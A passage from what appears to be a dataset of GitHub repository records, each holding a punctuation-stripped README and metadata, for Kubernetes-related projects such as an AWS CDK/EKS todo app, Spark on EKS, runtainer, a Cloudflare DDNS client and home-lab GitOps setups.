script bash file as part of the code base folder Make sure to replace with your AWS account number where you are trying to deploy run this application This will create the CDK infrastructure and pushes the WebAPI into the ECR Additionally the script registers the kube update config for the newly created cluster If you would like to perform these steps you can do these manual steps as below Step 1 Steps to build CDK cd aws cdk k8s dotnet todocdk dotnet build src cdk synth cdk bootstrap cdk deploy require approval never The above CLI will produce output similar to below Copy and execute this in the command line Below provided below is a sample only EksCdkStack cdkeksConfigCommand415D5239 aws eks update kubeconfig name cdkeksDB67CD5C 34ca1ef8aef7463c80c3517cc12737da region REGION role arn arn aws iam ACCOUNTNUMBER role EksCdkStack AdminRole38563C57 57FLB39DWVJR Step 2 Steps to Build and push WebAPI into ECR todo app ECR repository created as part of above CDK infrastructure cd aws cdk k8s dotnet todocdk dotnet build aws ecr get login password region REGION docker login username AWS password stdin ACCOUNTNUMBER dkr ecr REGION amazonaws com docker build t todo app docker tag todo app latest ACCOUNTNUMBER dkr ecr REGION amazonaws com todo app latest docker push ACCOUNTNUMBER dkr ecr REGION amazonaws com todo app latest Make sure to update your region and account number above Step 3 Steps to create kubernetes service and pods using cdk8s cd aws cdk k8s dotnet todocdk8s pip install pipenv cdk8s import pipenv install pipenv install cdk8s synth kubectl apply f dist cdk8s k8s yaml After this is run review the list cdk8s k8s yaml cdk8s created k8s yamls that are needed for deploying loading the image from the ECR A sample is provided below The generated yaml has a service deployment apiVersion v1 kind Service metadata name cdk8s todo app service 4b26805b apiVersion apps v1 kind Deployment metadata spec containers image REDACTED dkr ecr us east 1 amazonaws com todo app latest name app ports containerPort 8080 Once the kubernetes objects are created you can see the created pods and services like below NOTE This could take sometime to start the ELB cluster with the deployment kubectl get pods kubectl get services 3 Stack Verification The NET code provided cdk src EksCdk Program cs creates the EksCdkStack as coded Based on the name provided a CloudFormation stack is built You will be able to see this new stack in AWS Console CloudFormation Stack creation creates close to 44 resources including a VPC Some of them are provided here for your reference Review some of the components the CDK will be creating AWS EC2 EIP eks vpc PublicSubnet2 EIP AWS EC2 VPC eks vpc AWS EC2 InternetGateway eks vpc IGW AWS EC2 VPCGatewayAttachment eks vpc VPCGW AWS EC2 Subnet eks vpc PrivateSubnet1 Subnet AWS EC2 Subnet eks vpc PublicSubnet2 Subnet AWS EC2 Subnet eks vpc PublicSubnet1 Subnet AWS EC2 SecurityGroup cdk eks ControlPlaneSecurityGroup AWS RDS DBCluster Database AWS EC2 SecurityGroup db sg AWS RDS DBInstance Database Instance1 AWS RDS DBInstance Database Instance2 At the end of this step you will create the Amazon Aurora DB table and the EKS Cluster exposed with a Classic LoadBalancer where the NET Core Web API is deployed exposed to the outside world The output of the stack returns the following HealthCheckUrl http api values Web ApiUrl http api todo Alt text blog testingput png raw true Title Once the above CloudFormation stack is created successfully take a moment to identify the major components Here is the infrastructure youd have created Infrastructure containing VPC Public Private Subnet Route Tables Internet Gateway NAT Gateway Public Load Balancer EKS Cluster Other AWS Services ECR Amazon Aurora Database Serverless Systems Manager CloudWatch Logs Using CDK constructs we have built the above infrastructure and integrated the solution with a Public Load Balancer The output of this stack will give the API URLs for health check and API validation As you notice by defining the solution using CDK you were able to Use object oriented techniques to create a model of your system Organize your project into logical modules Code completion within your IDE Lets test the TODO API using any REST API tools like Postman Chrome extension ARC or RestMan GET Open browser and you can hit the Web ApiUrl to see the data http api todo POST Create a sample Set Headers as Content type application json Sample request Task Deploying WebAPI in K8s Status WIP Troubleshooting Issues with running the installation shell script Windows users Shell scripts by default opens in a new window and closes once done To see the execution you can paste the contents in a windows CMD and run them If you are deploying through the provided installation cleanup scripts make sure to have chmod x sh or chmod 777 sh similar to elevate the execution permission of the scripts Linux Users Permission issues could arise if you are not running as root user you may have to sudo su Error retrieving pods services kubectl Make sure to update your kube config This is an output from cdk deply in runinfra sh aws eks update kubeconfig name Make sure to review your kube config https docs aws amazon com eks latest userguide create kubeconfig html Check if local Docker is running Optionally enable Kubernetes Additional handy commands Docker Preferences Kubernetes Enable Kubernetes Apply Restart kubectl version kubectl config view kubectl config get contexts kubectl config use context kubernetes kubectl config use context docker for desktop If you get unAuthorized error kubectl get pods error You must be logged in to the server Unauthorized https aws amazon com premiumsupport knowledge center eks api server unauthorized error Redeployment If you are trying to remove and reinstall manually Make sure to delete CDK staging directory if you are trying to delete and reinstall the stack Your directory could be like below cdktoolkit stagingbucket guid Make sure to delete the SSM parameter Database Config AuroraConnectionString Where can i see the load balancer kubectl get svc This command can provide the LB url Optionally in AWS Console EC2 LoadBalancer My application is not loading or running when I hit the LB url We use Aurora Serverless Database The DB may take time to initialize for the first time Check if AWS Console RDS eks cdk aurora database is running Select Query Editor select the database enter the credentials This is provided in SSM Database Config AuroraConnectionString run select from ToDos Check if the pods are running kubectl get pods kubectl describe pod kubectl exec t i bash My CDK8s deployment failed Make sure you have the prerequisites versions ex pipenv python kubectl Check your kubectl pods services ex kubectl get pods kubectl get src to make sure you are able to connect and view the deployment kube config issues Open AWS Console CloudFormation EksCdkStack Output ,2020-09-03T22:36:10Z,2020-09-29T02:39:49Z,C#,Organization,5,4,3,2,master,amazon-auto#navbalaraman,2,0,0,1,0,1,0
minibear2333,kubernetes-book,,kubernetes book license https img shields io github license minibear2333 kubernetes book svg issues https img shields io github issues minibear2333 kubernetes book svg stars https img shields io github stars minibear2333 kubernetes book svg forks https img shields io github forks minibear2333 kubernetes book svg Docker Kubernetes k8s Star issue https github com minibear2333 kubernetes book issues pr https github com minibear2333 kubernetes book pulls gitbook tools gitbook md https k8s coding3min com tips mac command windowsctrl Docker Docker Docker Docker Docker Docker Dockerfile Docker Dockerfile Introduction README md Docker Docker md me md Docker chapter 1 docker story md Docker chapter 1 deal what md Docker chapter 1 docker superiority md Docker chapter 1 what is image md Docker chapter 1 what is docker md Docker chapter 1 what is repository md Docker Docker md Docker chapter 1 Docker md CentOS Docker chapter 1 Centos md Windows Docker chapter 1 Windows md Macbook Docker chapter 1 Macbook md docker Docker chapter 1 README md Docker Docker chapter 2 README md Docker chapter 2 base command md Docker chapter 2 image command md Docker chapter 2 container command md Docker chapter 2 container command2 md Docker chapter 2 resources command md wordpress Docker chapter 2 lab wordpress md python Docker chapter 2 lab python md Kubernetes license apache LICENSE github https github com minibear2333 blog coding3min com https coding3min com linux images gzh jpg 100 docker k8s 201910 BAThr,2020-10-27T15:42:50Z,2020-11-22T16:18:00Z,Shell,User,1,4,0,20,master,minibear2333,1,9,9,0,2,0,0
bbenzikry,spark-eks,aws#docker#dockerfile#eks#eks-cluster#glue-catalog#kubernetes#kubernetes-operator#metastore#spark,spark on eks Examples and custom spark images for working with the spark on k8s operator on AWS Allows using Spark 2 with IRSA and Spark 3 with IRSA and AWS Glue as a metastore Note Spark 3 images also include relevant jars for working with the S3A commiters https hadoop apache org docs r3 1 1 hadoop aws tools hadoop aws committers html If you re looking for the Spark 3 custom distributions you can find them here https github com bbenzikry spark glue releases Note Spark 2 images will not be updated please see the FAQ faq operator https img shields io docker cloud build bbenzikry spark eks operator style plastic label operator https hub docker com r bbenzikry spark eks operator spark eks https img shields io docker cloud build bbenzikry spark eks style plastic label spark eks https hub docker com r bbenzikry spark eks Prerequisites Deploy spark on k8s operator https github com GoogleCloudPlatform spark on k8s operator using the helm chart https github com helm charts tree master incubator sparkoperator and the patched operator https github com bbenzikry spark on k8s operator tree hive subpath image bbenzikry spark eks operator latest Suggested values for the helm chart can be found in the flux flux operator yaml example Note Do not create the spark service account automatically as part of chart use using IAM roles for service accounts on EKS Creating roles and service account Create an AWS role for driver Create an AWS role for executors AWS docs on creating policies and roles https docs aws amazon com eks latest userguide create service account iam policy and role html Add default service account EKS role for executors in your spark job namespace optional yaml NOTE Only required when not building spark from source or using a version of spark 3 1 In 3 1 executor roles will rely on the driver definition At the moment they execute with the default service account apiVersion v1 kind ServiceAccount metadata name default namespace SPARKJOBNAMESPACE annotations can also be the driver role eks amazonaws com role arn arn aws iam ACCOUNTID role executor role Make sure spark service account used by driver pods is configured to an EKS role as well yaml apiVersion v1 kind ServiceAccount metadata name spark namespace SPARKJOBNAMESPACE annotations eks amazonaws com role arn arn aws iam ACCOUNTID role driver role Building a compatible image For spark 3 0 0 see spark2 Dockerfile docker spark2 Dockerfile For spark 3 0 0 see spark3 Dockerfile docker spark3 Dockerfile For pyspark see pyspark Dockerfile docker pyspark Dockerfile Submit your spark application with IRSA support Select the right implementation for you Below are examples for latest versions If you want to use pinned versions all images are tagged by the commit SHA You can find a full list of tags here https hub docker com repository docker bbenzikry spark eks tags dockerfile spark2 FROM bbenzikry spark eks spark2 latest spark3 FROM bbenzikry spark eks spark3 latest pyspark2 FROM bbenzikry spark eks pyspark2 latest pyspark3 FROM bbenzikry spark eks pyspark3 latest Submit your SparkApplication spec yaml hadoopConf IRSA configuration fs s3a aws credentials provider com amazonaws auth WebIdentityTokenCredentialsProvider driver labels serviceAccount SERVICEACCOUNTNAME See https github com kubernetes kubernetes issues 82573 securityContext fsGroup 65534 Working with AWS Glue as metastore Glue Prerequisites Make sure your driver and executor roles have the relevant glue permissions json5 Example below depicts the IAM policy for accessing db1 table1 Modify this as you deem worthy for spark application access Effect Allow Action glue Database glue Table glue Partition Resource arn aws glue us west 2 123456789012 catalog arn aws glue us west 2 123456789012 database db1 arn aws glue us west 2 123456789012 table db1 table1 arn aws glue eu west 1 123456789012 database default arn aws glue eu west 1 123456789012 database globaltemp arn aws glue eu west 1 123456789012 database parquet Make sure you are using the patched operator image Add a config map to your spark job namespace as defined here conf configmap yaml yaml apiVersion v1 data hive site xml hive imetastoreclient factory class com amazonaws glue catalog metastore AWSGlueDataCatalogHiveClientFactory kind ConfigMap metadata namespace SPARKJOBNAMESPACE name spark custom config map Submitting your application In order to submit an application with glue support you need to add a reference to the configmap in your SparkApplication spec yaml kind SparkApplication metadata name my spark app namespace SPARKJOBNAMESPACE spec sparkConfigMap spark custom config map Working with the spark history server on S3 Use the appropriate spark version and deploy the helm https github com helm charts blob master stable spark history server chart Flux Helm values reference here flux history yaml FAQ Where can I find a Spark 2 build with Glue support As spark 2 becomes less and less relevant I opted against the need to add glue support You can take a look here https github com bbenzikry spark glue blob main build sh for a reference build script which you can use to build a Spark 2 distribution to use with the Spark 2 dockerfile docker spark2 Dockerfile Why a patched operator image The patched image is a simple implementation for properly working with custom configuration files with the spark operator It may be added as a PR in the future or another implementation will take its place For more information see the related issue https github com GoogleCloudPlatform spark on k8s operator issues 216,2020-08-27T23:59:11Z,2020-12-17T04:04:13Z,Dockerfile,User,1,4,0,34,main,bbenzikry,1,0,0,1,2,0,0
kubefetch,kubefetch,,Hi there kubefetch kubefetch is a special repository because its README md this file appears on your GitHub profile Here are some ideas to get you started Im currently working on Im currently learning Im looking to collaborate on Im looking for help with Ask me about How to reach me Pronouns Fun fact,2020-08-23T08:23:05Z,2020-08-29T15:50:08Z,Python,User,1,4,1,2,master,kubefetch,1,0,0,0,0,0,1
phenrigomes,blue-discount,grpc#k8s#kubernetes#microserice#tilt,blue discount The project uses the following packages and tools Docker https www docker com Kubernetes https kubernetes io Kustomize https kustomize io Tilt https tilt dev development Gingko https github com onsi ginkgo BDD for Go Gomega https github com onsi gomega Gorm https gorm io index html Viper https github com spf13 viper Go GRPC https github com grpc grpc go Running locally The project was created to run in Kubernetes You dont need to install dependencies such as Postgres in your machine because all k8s objects are used by Tilt during development Tilt is a tool to setup the project in k8s with support to reload on changes You get the docs to install it here https docs tilt dev install html and to create a local k8s cluster is recommended Kind https github com tilt dev kind local To interact with the cluster kubectl cluster info context kind kind Create a dev namespace kubectl create namespace dev To run the project tilt up After that you can use a tool such as BloomRPC https github com uw labs bloomrpc to make rpc calls on http localhost 8000 or get the metrics on http localhost 8083 metrics Testing To test the service make test To test with coverage make test cov,2020-09-09T01:05:09Z,2020-10-18T23:42:22Z,Go,User,1,4,1,17,master,phenrigomes,1,0,0,0,0,0,0
crutonjohn,gitops,,It s My k8s in a Box Discord https img shields io badge discord chat 7289DA svg maxAge 60 style flat square https discord gg DNCynrJ book nbsp Overview Welcome to my home Kubernetes cluster This repo is my Kubernetes cluster in a declarative state Flux https github com fluxcd flux and Helm Operator https github com fluxcd helm operator watch my cluster cluster folder and makes the changes to my cluster based on the yaml manifests Feel free to join our Discord https discord gg DNCynrJ if you have any questions computer nbsp Hardware configuration All my Kubernetes master and worker nodes below are running bare metal Ubuntu 20 04 x Device Count OS Disk Size Data Disk Size Ram Purpose Raspberry Pi 4 3 120GB USB Booting SSD N A 4 GB k8s Masters Dell R610 3 2x 120GB SSD RAID1 2x 1TB HDD RAID0 longhorn 48GB k8s Workers Xyratex HB 1235 1 N A 3x 4TB HDD nfs N A ZFS Main Storage memo nbsp IP addresses This table is a reference to IP addresses in my deployments and may not be fully up to date Deployment Address nginx ingress external 192 168 130 100 nginx ingress internal 192 168 130 101 blocky 192 168 130 102 unifi 192 168 130 103 longhorn 192 168 130 104 minecraft 192 168 130 110 handshake nbsp Thanks A lot of inspiration for this repo came from the following people billimek k8s gitops https github com billimek k8s gitops carpenike k8s gitops https github com carpenike k8s gitops dcplaya k8s gitops https github com dcplaya k8s gitops rust84 k8s gitops https github com rust84 k8s gitops blackjid homelab gitops https github com blackjid homelab gitops bjw s k8s gitops https github com bjw s k8s gitops nlopez k8shome https github com nlopez k8shome onedr0p k3s gitops https github com onedr0p k3s gitops,2020-09-07T16:38:48Z,2020-12-29T08:31:01Z,Shell,User,1,4,0,313,master,crutonjohn,1,0,6,4,1,0,0
plumber-cd,runtainer,container#docker#k8s#kubernetes#local#run,runtainer Run anything as a container runtainer runtainer Getting Started getting started Installation installation Brew brew From Release from release From Sources from sources Usage usage Basic container run basic container run Exec into container and stay there exec into container and stay there Extra volumes and port forwarding extra volumes and port forwarding Extra ENV variables extra env variables Custom directory custom directory Piping piping Troubleshooting troubleshooting Configuration configuration Why why Disclaimer disclaimer How how Getting Started Installation Brew Installation with brew is coming later From Release Download a binary from Releases https github com plumber cd runtainer releases All binaries built with GitHub Actions and you can inspect how github workflows release yml Don t forget to add it to your PATH From Sources You can build it yourself of course and Go made it really easy bash go install github com plumber cd runtainer version Don t forget to add it to your PATH Usage See full CLI docs runtainer md Basically the idea is that on the left of the image you provide any arguments to the runtainer itself on the right all the way before args will be passed as is to container engine i e docker and the rest will be supplied as CMD to the container A few examples are below Basic container run bash runtainer alpine whoami runtainer maven 3 6 3 jdk 14 mvn version Exec into container and stay there bash runtainer alpine sh OR runtainer alpine entrypoint sh Of course entrypoint is a regular docker arg Extra volumes and port forwarding This one is especially fun as basically this Jenkins Master in the container will have aws k8s etc access from your laptop How cool is that huh bash runtainer jenkins jenkins 2 235 5 lts v cd pwd jenkins var jenkinshome p 8080 8080 v and p are docker args as well Extra ENV variables bash runtainer maven 3 6 3 jdk 14 e PROFILE mvn version OR runtainer maven 3 6 3 jdk 14 e PROFILE foo mvn version e is a docker arg It will also discover ENV variables with RTVAR and RTEVAR prefixes bash RTVARFOO foo RTEVARBAR bar runtainer alpine env You will see that RTVARFOO was passed to the container as is and RTEVARBAR was passed to the container as BAR i e removing the prefix Custom directory bash runtainer d tmp alpine touch hi txt Here d on the left was an arg of runtainer itself Piping bash echo hi runtainer t false alpine xargs echo runtainer alpine echo hi runtainer t false alpine xargs echo By default runtainer runs containers with interactive and tty so you could use container interactively with minimum extra moves Note we had to explicitly disable tty so it could read from the host stdout You can even pipe multiple runtainer calls too Troubleshooting By default runtainer designed so it doesn t leave any residue as it s whole idea is to run internals of the container like they were installed right on the host It s designed to be transparent Most and foremost it is important to STDOUT and STDERR we can t afford runtainer to pollute the output from the container as it might be meant to be consumed by something else like json yaml output Log files also viewed as potentially unwanted leftovers With that in mind it leaves no traces of it s own unless it fails then and only then it prints error message and or stack trace to STDERR It might not be enough for troubleshooting so there is two args log and verbose The later automatically enables the first It spits out runtainer log file to the directory it is started from Configuration The tool can be configured with both files and ENV variables ENV variables prefixed with RT may be used i e RTLOG true For config files it supports many config file formats including JSON TOML YAML HCL envfile and Java properties formats Log files can be located in multiple locations and they read on top of each other with merging in the following order 1 Global system level config in runtainer config can be overridden with config 1 Local config file runtainer yaml or any other supported extension in the directory runtainer is started in 1 Local config file runtainer yaml or any other supported extension in the directory runtainer specified by dir if any This can be useful to configure on per project or per directory basis with committing that config to Git Config files and env variables apart from being an alternative source for CLI args configuration can also be used to configure various host image or container related things See the following yaml example yaml log true env Var FOO have an explicit hardcoded value here FOO foo Var BAR does not have a value so it will be mirrored from the host at runtime BAR null volumes hostMapping src home foo bar dest root baz Run it with verbose and you will be able to visually inspect what the tool automatically discovers for you Why Containers purpose is to run every process in it s own isolated self contained and portable environment This is a very well known and widely adopted concept in application development What is less commonly used is the fact that you can also pack your toolset as a container image and run it anywhere Think containers like a brew or chocolatey except that you never actually install anything on your workstation so as a bonus you can easily choose which version of what you want to use Consider the following example You need to run AWS CLI You either pack it as a container image yourself or use some existing image like amazon aws cli https hub docker com r amazon aws cli You can do something like this bash docker run amazon aws cli sts get caller identity Of course isolated container will have no AWS credentials whatsoever but if you have an active session on your workstation you can do something like bash docker run v cd pwd aws root aws e AWSPROFILE e AWSDEFAULTREGION amazon aws cli sts get caller identity You can go very far with this concept You can mount other similar known locations let s say m2 kube etc current working directory and pass any known environment variables to the inside Basically your workstation considered stateful and used as a persistent storage and with containers you can easily reproduce any runtime environment you need any platform os toolset etc You can also easily choose which version of your toolset you want to run at any given time bash docker run amazon aws cli 2 0 40 sts get caller identity And in case you are using multiple versions all the time which is common especially in a micro stack world for stability purposes you don t need to re install the software all the time So containers also can be used as virtualenv or rvm of some sort Also part of the image could be any number of useful wrappers and scripts so you can package complex routines involving multiple tools into one executable and distribute it to your team members so they can run it 1 1 as you did As you probably already imagined the only problem with this is a lot of typing You got to provide so many arguments to mount all the locations and pass in all the environment variables This is a lot of routine boring manual work This tool basically aims to remove that overhead It will automatically discover all known file system locations and environment variables and pass them to the container so you don t have to It is basically a smart wrapper for docker run or kubernetes run commands Disclaimer Be mindful of what you run This tool s mere purpose is to run the container as if it s internals were installed on your host That means the usual isolation attributed to the containers in general is compromised any potential malware could easily escape to the host level and mess with your stuff It will also have access to the docker on the host You should really know and trust containers you run with RunTainer as like you do it with regular software you install How This tool will do the following 1 Discover and mount to your container well known locations such as ssh aws etc as well as user defined locations 1 Expose to your container well known environment variables such as AWSPROFILE AWSDEFAULTREGION etc as well as user defined environment variables 1 Mount cwd and make it a cwd inside the container 1 Make UID GID to match your host inside the container 2 Run the command you specified in your container or default ENTRYPOINT,2020-08-16T00:20:49Z,2020-09-10T11:15:37Z,Go,Organization,2,5,1,8,master,dee-kryvenko,1,2,2,10,1,0,7
nickvdyck,cloudflare-ddns,cloudflare-dns#ddns-client#dns#dynamic-dns#ipv4#ipv6#k8s#raspberry-pi#self-hosting,Cloudflare DDNS Build status ci badge ci url NuGet nuget package badge nuget package url feedz io feedz package badge feedz package url Coverage sonar cloud coverage badge sonar cloud coverage url Dynamic DNS service based on Cloudflare Access your home network remotely via a custom domain name without a static IP What it does Cloudflare DDNS allows you to run your own Dynamic DNS service from the comfort of your own infrastructure Combined with a Raspberry PI or whatever spare hardware you still have lying around it helps promote a more decentralized internet at a low cost During execution it resolves your current public IPv4 and IPv6 addresses and creates updates DNS records in Cloudflare to point to your home address It keeps track of any DNS records that it is managing giving you some peace of mind and allowing it to run in non empty Cloudflare zones without having to worry that your public blog gets taken down Any stale or duplicate records will get safely cleaned up Getting started Local Installation Download NET Core 3 1 https dotnet microsoft com download or newer Once installed run this command sh dotnet tool install global cloudflare ddns Setup your dns records and use the following to start syncing your public ip to cloudflare sh cloudflare ddns It s advised to run this program at repeated intervals The following will walk you through setting up a recurring task on Windows and Linux Linux On Linux you can leverage crontab to schedule this command at a recurring interval 1 Create a config file somewhere on your distro 2 Run the following code in terminal this will launch your default editor with the crontab config file bash crontab e 3 Add the following lines to sync your DNS records every 15 minutes bash 15 cloudflare ddns c path to your config file config json This will schedule a cronjob and makes sure your DNS is synced every 15 minutes Windows TODO Helm A helm chart is available in the charts folder for more information about the available values have a look at the README inside the chart charts README md For helm deployments you don t need to provide a config json this will get generated for you At the moment there is no helm install available yet this is on my TO DO list though To get started with helm clone the repository or copy over the files in the charts folder Authentication To authenticate you will need to create a Cloudflare API token traditional API keys are not supported To generate a new API token go to your Cloudflare Profile https dash cloudflare com profile api tokens and create a token capable of Edit DNS There are 2 ways you can provide this API token 1 Add an environment variable CLOUDFLAREAPITOKEN with the value of your token 2 Add an apiToken key at the root of your config json Configuration The tool can be configured with a config json file which by default will get picked up at the cwd It s also possible to change the path or name to the configuration file via c or config A minimal valid config file looks as follows json records zoneId subdomain proxied true For a minimal valid configuration all you need to define are the records which you would like to sync But there are a few more options available to play with json apiToken ipv4 true ipv6 true resolvers http ipv4Endpoint https api ipify org ipv6Endpoint https api6 ipify org dns cloudflare order http dns records zoneId subdomain proxied true zoneId subdomain proxied false Config json Values Config Key Type Default Description apiToken string Prefer using CLOUDFLAREAPITOKEN environment variable instead Cloudflare API token required to talk to the Cloudflare REST API traditional API keys are not supported Make sure this token has the correct permissions for each zone that it needs to create a record Have a look at the Authentication section ipv4 bool true Determines if public ipv4 should get resolved ipv6 bool true Determines if public ipv6 should get resolved resolvers http ipv4Endpoint string https api ipify org HTTP REST endpoint for HTTP resolver to determine public ipv4 address resolvers http ipv6Endpoint string https api6 ipify org HTTP REST endpoint for HTTP resolver to determine public ipv6 address resolvers dns string cloudflare DNS nameserver to use to resolve public ipv4 or and ipv6 addresses Supported servers are cloudflare and google resolvers order list http dns Determines the order in which resolvers will be used By default it will first try to resolve an IP via HTTP and fallback to DNS It s possible to change the order and even leave out a specific resolver if you for example only want to resolve over HTTP An empty list is not supported resources object records list List of subdomains to sync in a given Cloudflare zone eg Record Key Type Default Description zoneId string The ID of the zone where the DNS record will be configured From your dashboard click into the zone Under the review tab scroll down and the zone ID is listed on the right subdomain string The subdomain you want to update with an A or AAAA record IMPORTANT Only write the subdomain name do not include the base this is inferred from the zone eg foo or an empty string to update the base domain proxied bool false Determines whether requests get proxied through Cloudflare This usually disables SSH Usage You can use help to get an overview of accepted arguments cloudflare ddns 0 3 0 Cloudflare DDNS Usage cloudflare ddns options Options c config Path to the config json file defaults to the current working directory l log level VALUE Set the log level verbose info warning error defaults to info v version Show current version h help Show help information c or config allows configuring the path to the config json file By default the tool will look in the current directory for this file l or log level allows changing the verbosity of the tool By default it set to info FAQ Can I use my own IP address resolver Yes you most definitely can The specification is fairly simple a successful response should return a 200 status code with the IP address as plain text Any other status code will get interpreted as an error and thus ignored There is no example of a resolver at the moment but one for azure functions is coming soon How can I best host multiple subdomains from the same IP You can save yourself some trouble when hosting multiple domains pointing to the same IP address in the case of Traefik by defining one A AAAA record ddns example com pointing to the IP of the server that will be updated by this DDNS script For each subdomain create a CNAME record pointing to ddns example com Now you don t have to manually modify the script config every time you add a new subdomain to your site I keep getting errors related to resolving my public IPv6 address When running in verbose mode you will get a richer logging experience And thus will see lines telling you if it can t resolve an IPv4 or IPv6 address If you are running in an environment that only uses IPv4 for example docker or a default k8s setup Then you won t be able to resolve your public IPv6 address and that s why you will see these error messages If you for certain know that you can t resolve IPv6 in your environment or don t need your public IPV6 to be synced then you can turn this off in your config json file json ipv6 false License Copyright 2020 Nick Van Dyck https nvd codes MIT ci url https github com nickvdyck cloudflare ddns ci badge https github com nickvdyck cloudflare ddns workflows Main badge svg nuget package url https www nuget org packages cloudflare ddns nuget package badge https img shields io nuget v cloudflare ddns svg style flat square label cloudflare ddns sonar cloud coverage url https sonarcloud io dashboard id nickvdyckcloudflare ddns sonar cloud coverage badge https sonarcloud io api projectbadges measure project nickvdyckcloudflare ddns metric coverage feedz package url https f feedz io nvd cloudflare ddns packages cloudflare ddns latest download feedz package badge https img shields io badge endpoint svg url https 3A 2F 2Ff feedz io 2Fnvd 2Fcloudflare ddns 2Fshield 2Fcloudflare ddns 2Flatest label cloudflare ddns,2020-11-09T22:23:24Z,2020-12-06T10:26:31Z,C#,User,1,4,0,42,main,nickvdyck,1,4,4,0,0,0,2
Sitecore,container-deployment,,Repository of Sitecore container deployment files start stats License MIT https img shields io badge License Apache 202 0 green svg style flat square https opensource org licenses Apache 2 0 end stats Repository for official Sitecore community and demo deployment files This will provide Sitecore customers with examples on how to deploy Sitecore containers using various methods such as compose k8s and helm Documentation Official documentation on Sitecore container deployment files can be found here https dev sitecore net Please browse to the relevant product for example SXP and locate Installation Guides in the Download options for Sitecore Container deployments section Support Support for this repository is provided through Sitecore Support Portal Please find more information about how to use the portal here https kb sitecore net articles 654910 There is no official support available for experimental and demo areas of this repository Any inquiries or issues reported directly to this repository have no SLA Contribute If you wish to contribute or provide suggestions we are open to issue reports but will not accept pull requests to this repository Any inquiries or issues reported directly to this repository have no SLA,2020-12-02T00:09:35Z,2020-12-22T20:31:17Z,Shell,Organization,6,4,1,14,master,sc-jonasbangchristensen#IgorKorytko,2,4,4,1,0,1,4
neuroglia-io,K8s,crd#dotnet#k8s#kubernetes,Neuroglia K8s NET Standard 2 1 library that provides abstractions and default implementations to manage Kubernetes Custom Resource Definitions thanks to an IKubernetes client https github com kubernetes client csharp Usage Nuget Package https www nuget org packages Neuroglia K8s dotnet add package Neuroglia K8s Sample Code Defining a Custom Resource Definition c Example of a TEST CRD public class TestDefinition CustomResourceDefinition public TestDefinition base k8s neuroglia io v1alpha1 Test tests public static class CustomResourceDefinitions public static TestDefinition Test new TestDefinition Defining a Custom Resource c Example of an instance of a Test CRD public class Test CustomResource public Test base CustomResourceDefinitions Test public Test V1ObjectMeta metadata TestSpec spec this this Metadata metadata this Spec spec The spec of the Test CRD public class TestSpec JsonProperty PropertyName value public string Value get set The status of the Test CRD public class TestStatus JsonProperty PropertyName status public string Status get set Installing the CRD on Kubernetes 1 Create the CRD yaml file yaml apiVersion apiextensions k8s io v1beta1 kind CustomResourceDefinition metadata name tests k8s neuroglia io must be the concatenation of the plural and the group parameters supplied in your CRD class plural group spec group k8s neuroglia io must be the same group than provided in your CRD class in the ApiVersion parameter group version subresources add this block if your CRD uses a status otherwise remove status versions name v1alpha1 must be the same version than provided in your CRD class in the ApiVersion parameter group version served true storage true scope Namespaced add this line if the CRD is to be namespaced otherwise remove names plural tests must be the same than provided in your CRD class singular test should be the singularized version of the plural value supplied in your CRD class kind Test must be the same than provided in your CRD class 2 Apply the file using kubectl powershell kubectl apply f test crd yaml Creating a new Custom Resource programatically thanks to the IKubernetes C client https github com kubernetes client csharp c var kube new Kubernetes KubernetesClientConfiguration InClusterConfig var test await kube CreateNamespacedCustomObjectAsync new Test new TestSpec Value Hello world mynamespace Check whether the Custom Resource has been successfully created powershell kubectl get tests n mynamespace Creating a new Custom Resource declaratively 1 Create the Custom Resource s yaml file yaml apiVersion k8s neuroglia io v1alpha1 kind Test metadata name test spec value hello world 2 Apply the file using kubectl powershell kubectl apply f test yaml 3 Check whether the Custom Resource has been successfully created powershell kubectl get tests Watching events on a Custom Resource Definition c var logger LoggerFactory Create var kube new Kubernetes KubernetesClientConfiguration InClusterConfig var crd CustomResourceDefinitions Test var handler new CustomResourceEventDelegate e test switch e case WatchEventType Added logger LogInformation Test added break case WatchEventType Modified logger LogInformation Test modified break case WatchEventType Deleted logger LogInformation Test deleted break case WatchEventType Bookmark logger LogInformation Test version changed break case WatchEventType Error logger LogError Test error break default throw new NotSupportedException The specified watch event type e is not supported var watcher new CustomResourceEventWatcher logger kube crd namespaceProperty handler await watcher StartAsync Examples There is an extensive example in the examples directory https github com neuroglia io K8s tree master examples Running the examples powershell git clone git github com neuroglia io K8s git cd K8sexampleswatcher dotnet run Contributing Please see CONTRIBUTING md https github com neuroglia io K8s blob master CONTRIBUTING md for instructions on how to contribute,2020-10-12T13:47:22Z,2020-12-14T12:01:14Z,C#,Organization,2,3,1,3,main,Neuroglia,1,0,0,0,0,0,0
jamesmoriarty,k8s-gitops,,k8s gitops Repo for my k8s home lab Features K3s Cilium Flux2 MetalLB L2 ExternalDNS AWS Route53 DynamicDNS CronJob ExternalDNS Ingress Transmission NAT UDP MiniDLNA UPnP UDP Monitoring Helm kube prometheus stack Logging Helm loki stack Diagram Arch docs arch png Requirements Ubuntu 20 04 1 LTS Setup GITHUBUSERNAME GITHUBTOKEN bin bootstrap Notes http transmission home jamesmoriarty xyz http alertmanager home jamesmoriarty xyz http grafana home jamesmoriarty xyz explore http prometheus home jamesmoriarty xyz,2020-11-15T10:53:00Z,2020-12-08T10:33:19Z,Shell,User,1,3,0,64,main,jamesmoriarty,1,0,1,0,0,0,0
ahmgeek,dynatrace,,dynatrace A repository to show how you can work with dynatrace dynatrace com on k8s x Get a Dynatrace Trial License and instrument a K8s cluster and instrument a sample application x Install Prometheus via Prometheus Operator x Install Keptn keptn sh on the K8s cluster and deploy its sample app carts x Manually add a Scrape Job to Prometheus for the carts service sample app to get monitoring data x Manually set an Alert Rule for Prometheus to get alerts in case of a problem e g response time degradation,2020-08-27T16:10:22Z,2020-12-04T12:48:19Z,Shell,User,1,3,0,17,master,ahmgeek,1,0,0,0,0,0,0
